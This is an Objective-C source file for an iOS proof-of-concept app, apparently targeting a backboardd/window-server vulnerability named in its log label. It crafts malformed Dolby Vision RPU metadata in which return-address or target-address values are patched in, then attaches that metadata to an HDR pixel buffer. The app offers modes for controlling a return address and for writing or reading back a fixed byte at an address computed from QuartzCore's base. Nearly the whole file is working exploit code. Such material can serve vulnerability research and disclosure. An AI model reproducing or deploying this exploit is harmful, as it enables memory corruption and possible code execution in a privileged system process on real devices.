#import <AVFoundation/AVFoundation.h>
#import <CoreVideo/CoreVideo.h>
#import <IOSurface/IOSurfaceRef.h>
#import <QuartzCore/QuartzCore.h>
#import <UIKit/UIKit.h>
#import <dlfcn.h>
#import <mach-o/loader.h>
#import <os/log.h>
#import <stdio.h>

static os_log_t ProbeLog(void) {
    static os_log_t log;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        log = os_log_create(
            "dev.0xjohnny.CVE-2026-112688-backboardd",
            "poc"
        );
    });
    return log;
}

static void ProbePrint(NSString *message) {
    fprintf(stderr, "DOVI-PROBE %s\n", message.UTF8String);
    fflush(stderr);
    os_log_fault(ProbeLog(), "%{public}@", message);
}

typedef NS_ENUM(NSUInteger, PayloadMode) {
    PayloadModeReturnAddress,
    PayloadModeFixedByteWrite,
    PayloadModeFixedByteReadback,
};

static PayloadMode SelectedPayloadMode(void) {
    NSArray<NSString *> *arguments = NSProcessInfo.processInfo.arguments;
    if ([arguments containsObject:@"--fixed-byte-write"]) {
        return PayloadModeFixedByteWrite;
    }
    if ([arguments containsObject:@"--fixed-byte-readback"]) {
        return PayloadModeFixedByteReadback;
    }
    return PayloadModeReturnAddress;
}

static BOOL SupportedQuartzCore(const struct mach_header_64 *header) {
    static const uint8_t expectedUUID[16] = {
        0x21, 0xfa, 0x01, 0x04, 0xf3, 0x08, 0x3b, 0xb3,
        0x8f, 0x3f, 0xe9, 0xde, 0x66, 0xf7, 0xcd, 0xec,
    };
    if (header == NULL || header->magic != MH_MAGIC_64) {
        return NO;
    }
    const struct load_command *command = (const struct load_command *)(header + 1);
    for (uint32_t index = 0; index < header->ncmds; index++) {
        if (command->cmd == LC_UUID) {
            const struct uuid_command *uuid = (const struct uuid_command *)command;
            return memcmp(uuid->uuid, expectedUUID, sizeof(expectedUUID)) == 0;
        }
        command = (const struct load_command *)((const uint8_t *)command + command->cmdsize);
    }
    return NO;
}

static NSMutableData *UnescapedRPU(NSData *data) {
    const uint8_t *bytes = data.bytes;
    NSMutableData *result = [NSMutableData dataWithCapacity:data.length];
    for (NSUInteger index = 0; index < data.length; index++) {
        if (index >= 2 && bytes[index - 2] == 0 && bytes[index - 1] == 0 && bytes[index] == 3) {
            continue;
        }
        [result appendBytes:&bytes[index] length:1];
    }
    return result;
}

static NSData *EscapedRPU(NSData *data) {
    const uint8_t *bytes = data.bytes;
    NSMutableData *result = [NSMutableData dataWithCapacity:data.length];
    for (NSUInteger index = 0; index < data.length; index++) {
        const uint8_t *output = result.bytes;
        NSUInteger length = result.length;
        if (length >= 2 && output[length - 2] == 0 && output[length - 1] == 0 && bytes[index] <= 3) {
            const uint8_t escape = 3;
            [result appendBytes:&escape length:1];
        }
        [result appendBytes:&bytes[index] length:1];
    }
    return result;
}

static uint8_t Level10Bit(uint64_t value, NSUInteger bit) {
    NSUInteger shift = (bit / 16) * 16 + 15 - (bit % 16);
    return (uint8_t)((value >> shift) & 1);
}

static BOOL PatchLevel10Value(
    NSMutableData *data,
    NSUInteger start,
    uint64_t oldValue,
    uint64_t newValue
) {
    uint8_t *bytes = data.mutableBytes;
    if (start + 64 > data.length * 8) {
        return NO;
    }
    for (NSUInteger bit = 0; bit < 64; bit++) {
        NSUInteger position = start + bit;
        uint8_t actual = (bytes[position / 8] >> (7 - (position % 8))) & 1;
        if (actual != Level10Bit(oldValue, bit)) {
            return NO;
        }
    }
    for (NSUInteger bit = 0; bit < 64; bit++) {
        NSUInteger position = start + bit;
        uint8_t mask = (uint8_t)(1U << (7 - (position % 8)));
        if (Level10Bit(newValue, bit)) {
            bytes[position / 8] |= mask;
        } else {
            bytes[position / 8] &= (uint8_t)~mask;
        }
    }
    return YES;
}

static uint32_t RPUCRC32(const uint8_t *bytes, NSUInteger length) {
    uint32_t crc = UINT32_MAX;
    for (NSUInteger index = 0; index < length; index++) {
        crc ^= (uint32_t)bytes[index] << 24;
        for (NSUInteger bit = 0; bit < 8; bit++) {
            crc = (crc & 0x80000000U) != 0
                ? (crc << 1) ^ 0x04c11db7U
                : crc << 1;
        }
    }
    return crc;
}

static NSData *FixedByteRPU(PayloadMode mode) {
    Dl_info image;
    if (dladdr((const void *)CACurrentMediaTime, &image) == 0
        || !SupportedQuartzCore(image.dli_fbase)) {
        ProbePrint(@"fixed-byte payload rejected: unsupported QuartzCore UUID");
        return nil;
    }

    const uint64_t oldTarget = 0x1f9c49088ULL;
    const uint64_t target = (uint64_t)image.dli_fbase + 0x5fd07088ULL;
    if ((uint32_t)(target >> 32) != (uint32_t)(oldTarget >> 32)) {
        ProbePrint(@"fixed-byte payload rejected: target left the selectable 4 GB range");
        return nil;
    }
    NSString *resource = mode == PayloadModeFixedByteWrite
        ? @"write-payload"
        : @"readback-payload";
    NSURL *url = [NSBundle.mainBundle URLForResource:resource withExtension:@"bin"];
    NSData *framed = url == nil ? nil : [NSData dataWithContentsOfURL:url];
    if (framed.length <= 4 || memcmp(framed.bytes, "\0\0\0\1", 4) != 0) {
        return nil;
    }

    NSData *escaped = [framed subdataWithRange:NSMakeRange(4, framed.length - 4)];
    NSMutableData *rpu = UnescapedRPU(escaped);
    NSUInteger bitOffset;
    uint64_t oldValue;
    uint64_t newValue;
    if (mode == PayloadModeFixedByteWrite) {
        bitOffset = 2735;
        oldValue = (uint64_t)(uint32_t)oldTarget << 32;
        newValue = (uint64_t)(uint32_t)target << 32;
    } else {
        bitOffset = 3073;
        oldValue = oldTarget & ~0xfffULL;
        newValue = target & ~0xfffULL;
    }
    if (!PatchLevel10Value(rpu, bitOffset, oldValue, newValue) || rpu.length < 6) {
        return nil;
    }

    uint8_t *bytes = rpu.mutableBytes;
    NSUInteger crcOffset = rpu.length - 5;
    uint32_t crc = RPUCRC32(bytes + 1, crcOffset - 1);
    bytes[crcOffset] = (uint8_t)(crc >> 24);
    bytes[crcOffset + 1] = (uint8_t)(crc >> 16);
    bytes[crcOffset + 2] = (uint8_t)(crc >> 8);
    bytes[crcOffset + 3] = (uint8_t)crc;
    ProbePrint([NSString stringWithFormat:
        @"fixed-byte %@ QuartzCore=%p target=0x%llx",
        mode == PayloadModeFixedByteWrite ? @"write" : @"readback",
        image.dli_fbase,
        target]);
    return EscapedRPU(rpu);
}

static NSData *CraftedRPU(void) {
    static NSData *rpu;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        PayloadMode mode = SelectedPayloadMode();
        if (mode != PayloadModeReturnAddress) {
            rpu = FixedByteRPU(mode);
            return;
        }
        NSURL *url = [NSBundle.mainBundle URLForResource:@"lr-control"
                                           withExtension:@"bin"];
        NSData *framed = url == nil ? nil : [NSData dataWithContentsOfURL:url];
        if (framed.length > 4) {
            rpu = [framed subdataWithRange:NSMakeRange(4, framed.length - 4)];
        }
    });
    return rpu;
}

static CFStringRef LookupCFString(const char *symbol, CFStringRef fallback) {
    CFStringRef *address = dlsym(RTLD_DEFAULT, symbol);
    return address != NULL && *address != NULL ? *address : fallback;
}

static CVPixelBufferRef gWindowServerPixelBuffer;
static CMSampleBufferRef gWindowServerSample;

static void FillTenBitPixelBuffer(CVPixelBufferRef pixelBuffer) {
    if (CVPixelBufferLockBaseAddress(pixelBuffer, 0) != kCVReturnSuccess) {
        return;
    }

    const size_t yWidth = CVPixelBufferGetWidthOfPlane(pixelBuffer, 0);
    const size_t yHeight = CVPixelBufferGetHeightOfPlane(pixelBuffer, 0);
    const size_t yStride = CVPixelBufferGetBytesPerRowOfPlane(pixelBuffer, 0);
    uint8_t *yBase = CVPixelBufferGetBaseAddressOfPlane(pixelBuffer, 0);
    for (size_t row = 0; row < yHeight; row++) {
        uint16_t *pixels = (uint16_t *)(yBase + row * yStride);
        for (size_t column = 0; column < yWidth; column++) {
            pixels[column] = (uint16_t)(256U << 6);
        }
    }

    const size_t uvWidth = CVPixelBufferGetWidthOfPlane(pixelBuffer, 1);
    const size_t uvHeight = CVPixelBufferGetHeightOfPlane(pixelBuffer, 1);
    const size_t uvStride = CVPixelBufferGetBytesPerRowOfPlane(pixelBuffer, 1);
    uint8_t *uvBase = CVPixelBufferGetBaseAddressOfPlane(pixelBuffer, 1);
    for (size_t row = 0; row < uvHeight; row++) {
        uint16_t *pixels = (uint16_t *)(uvBase + row * uvStride);
        for (size_t column = 0; column < uvWidth * 2; column++) {
            pixels[column] = (uint16_t)(512U << 6);
        }
    }
    CVPixelBufferUnlockBaseAddress(pixelBuffer, 0);
}

static NSString *SubmitRPUToWindowServer(AVSampleBufferDisplayLayer *displayLayer) {
    NSData *rpu = CraftedRPU();
    if (rpu == nil) {
        return @"raw RPU resource missing";
    }

    NSDictionary *attributes = @{
        (__bridge NSString *)kCVPixelBufferIOSurfacePropertiesKey: @{},
        (__bridge NSString *)kCVPixelBufferMetalCompatibilityKey: @YES,
    };
    CVPixelBufferRef pixelBuffer = NULL;
    CVReturn pixelStatus = CVPixelBufferCreate(
        kCFAllocatorDefault,
        1920,
        1080,
        kCVPixelFormatType_420YpCbCr10BiPlanarVideoRange,
        (__bridge CFDictionaryRef)attributes,
        &pixelBuffer
    );
    if (pixelStatus != kCVReturnSuccess || pixelBuffer == NULL) {
        return [NSString stringWithFormat:@"CVPixelBufferCreate=%d", (int)pixelStatus];
    }
    FillTenBitPixelBuffer(pixelBuffer);

    CVBufferSetAttachment(
        pixelBuffer,
        kCVImageBufferColorPrimariesKey,
        kCVImageBufferColorPrimaries_ITU_R_2020,
        kCVAttachmentMode_ShouldPropagate
    );
    CVBufferSetAttachment(
        pixelBuffer,
        kCVImageBufferTransferFunctionKey,
        kCVImageBufferTransferFunction_SMPTE_ST_2084_PQ,
        kCVAttachmentMode_ShouldPropagate
    );
    CVBufferSetAttachment(
        pixelBuffer,
        kCVImageBufferYCbCrMatrixKey,
        kCVImageBufferYCbCrMatrix_ITU_R_2020,
        kCVAttachmentMode_ShouldPropagate
    );

    CFStringRef rpuKey = LookupCFString(
        "kCVImageBufferDolbyVisionRPUDataKey",
        CFSTR("DolbyVisionRPUData")
    );
    CVBufferSetAttachment(
        pixelBuffer,
        rpuKey,
        (__bridge CFDataRef)rpu,
        kCVAttachmentMode_ShouldPropagate
    );

    CVBufferSetAttachment(
        pixelBuffer,
        LookupCFString("kCVImageBufferDolbyDMVersionKey", CFSTR("DolbyDMVersion")),
        CFSTR("4"),
        kCVAttachmentMode_ShouldPropagate
    );
    CVBufferSetAttachment(
        pixelBuffer,
        LookupCFString("kCVImageBufferDolbyCompatibilityIDKey", CFSTR("DolbyCompatibilityID")),
        CFSTR("1"),
        kCVAttachmentMode_ShouldPropagate
    );

    IOSurfaceRef surface = CVPixelBufferGetIOSurface(pixelBuffer);
    double headroom = 4.0;
    CFNumberRef headroomNumber = CFNumberCreate(
        kCFAllocatorDefault,
        kCFNumberDoubleType,
        &headroom
    );
    IOSurfaceSetValue(surface, kIOSurfaceContentHeadroom, headroomNumber);
    CFRelease(headroomNumber);

    CFDictionaryRef bulkAttachments = IOSurfaceCopyAllValues(surface);
    CFTypeRef copiedRPU = bulkAttachments == NULL
        ? NULL
        : CFDictionaryGetValue(bulkAttachments, CFSTR("DolbyVisionRPUData"));
    CFIndex bulkRpuLength = copiedRPU != NULL && CFGetTypeID(copiedRPU) == CFDataGetTypeID()
        ? CFDataGetLength(copiedRPU)
        : -1;
    ProbePrint([NSString stringWithFormat:
        @"WindowServer IOSurface id=%u bulk=%ld RPU=%ld expected=%lu",
        IOSurfaceGetID(surface),
        bulkAttachments == NULL ? -1L : (long)CFDictionaryGetCount(bulkAttachments),
        (long)bulkRpuLength,
        (unsigned long)rpu.length]);
    if (bulkAttachments != NULL) {
        CFRelease(bulkAttachments);
    }

    CMVideoFormatDescriptionRef format = NULL;
    OSStatus formatStatus = CMVideoFormatDescriptionCreateForImageBuffer(
        kCFAllocatorDefault,
        pixelBuffer,
        &format
    );
    if (formatStatus != noErr || format == NULL) {
        CFRelease(pixelBuffer);
        return [NSString stringWithFormat:@"format=%d", (int)formatStatus];
    }

    CMSampleTimingInfo timing = {
        .duration = CMTimeMake(1, 60),
        .presentationTimeStamp = kCMTimeZero,
        .decodeTimeStamp = kCMTimeInvalid,
    };
    CMSampleBufferRef sample = NULL;
    OSStatus sampleStatus = CMSampleBufferCreateReadyWithImageBuffer(
        kCFAllocatorDefault,
        pixelBuffer,
        format,
        &timing,
        &sample
    );
    CFRelease(format);
    if (sampleStatus != noErr || sample == NULL) {
        CFRelease(pixelBuffer);
        return [NSString stringWithFormat:@"sample=%d", (int)sampleStatus];
    }

    CFArrayRef sampleAttachments = CMSampleBufferGetSampleAttachmentsArray(sample, true);
    if (sampleAttachments != NULL && CFArrayGetCount(sampleAttachments) != 0) {
        CFMutableDictionaryRef first = (CFMutableDictionaryRef)CFArrayGetValueAtIndex(
            sampleAttachments,
            0
        );
        CFDictionarySetValue(first, kCMSampleAttachmentKey_DisplayImmediately, kCFBooleanTrue);
    }

    if (gWindowServerSample != NULL) {
        CFRelease(gWindowServerSample);
    }
    if (gWindowServerPixelBuffer != NULL) {
        CFRelease(gWindowServerPixelBuffer);
    }
    gWindowServerSample = sample;
    gWindowServerPixelBuffer = pixelBuffer;

    [displayLayer flushAndRemoveImage];
    [displayLayer enqueueSampleBuffer:sample];
    return [NSString stringWithFormat:
        @"submitted IOSurface %u to CoreAnimation status=%ld error=%@",
        IOSurfaceGetID(surface),
        (long)displayLayer.status,
        displayLayer.error];
}

@interface ProbeAppDelegate : UIResponder <UIApplicationDelegate>
@end

@interface ProbeSceneDelegate : UIResponder <UIWindowSceneDelegate>
@property(nonatomic, strong) UIWindow *window;
@property(nonatomic, strong) UILabel *statusLabel;
@property(nonatomic, strong) AVSampleBufferDisplayLayer *surfaceLayer;
@end

@implementation ProbeAppDelegate
- (BOOL)application:(UIApplication *)application
    didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    return YES;
}
@end

@implementation ProbeSceneDelegate

- (void)scene:(UIScene *)scene
    willConnectToSession:(UISceneSession *)session
    options:(UISceneConnectionOptions *)connectionOptions {
    if (![scene isKindOfClass:UIWindowScene.class]) {
        return;
    }

    self.window = [[UIWindow alloc] initWithWindowScene:(UIWindowScene *)scene];
    UIViewController *controller = [[UIViewController alloc] init];
    controller.view.backgroundColor = UIColor.blackColor;

    self.surfaceLayer = [AVSampleBufferDisplayLayer layer];
    self.surfaceLayer.frame = controller.view.bounds;
    self.surfaceLayer.videoGravity = AVLayerVideoGravityResizeAspectFill;
    self.surfaceLayer.toneMapMode = CAToneMapModeIfSupported;
    self.surfaceLayer.preferredDynamicRange = CADynamicRangeStandard;
    self.surfaceLayer.contentsHeadroom = 4.0;
    self.surfaceLayer.wantsExtendedDynamicRangeContent = NO;
    [controller.view.layer addSublayer:self.surfaceLayer];

    self.statusLabel = [[UILabel alloc] init];
    self.statusLabel.translatesAutoresizingMaskIntoConstraints = NO;
    self.statusLabel.font = [UIFont monospacedSystemFontOfSize:13 weight:UIFontWeightRegular];
    self.statusLabel.textColor = UIColor.whiteColor;
    self.statusLabel.numberOfLines = 0;
    self.statusLabel.text = @"Submitting crafted Dolby Vision RPU…";
    [controller.view addSubview:self.statusLabel];
    [NSLayoutConstraint activateConstraints:@[
        [self.statusLabel.leadingAnchor constraintEqualToAnchor:controller.view.safeAreaLayoutGuide.leadingAnchor constant:20],
        [self.statusLabel.trailingAnchor constraintEqualToAnchor:controller.view.safeAreaLayoutGuide.trailingAnchor constant:-20],
        [self.statusLabel.centerYAnchor constraintEqualToAnchor:controller.view.centerYAnchor],
    ]];

    self.window.rootViewController = controller;
    [self.window makeKeyAndVisible];

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        dispatch_async(dispatch_get_main_queue(), ^{
            NSString *result = SubmitRPUToWindowServer(self.surfaceLayer);
            ProbePrint(result);
            self.statusLabel.text = result;
        });
    });
}

@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(
            argc,
            argv,
            nil,
            NSStringFromClass(ProbeAppDelegate.class)
        );
    }
}
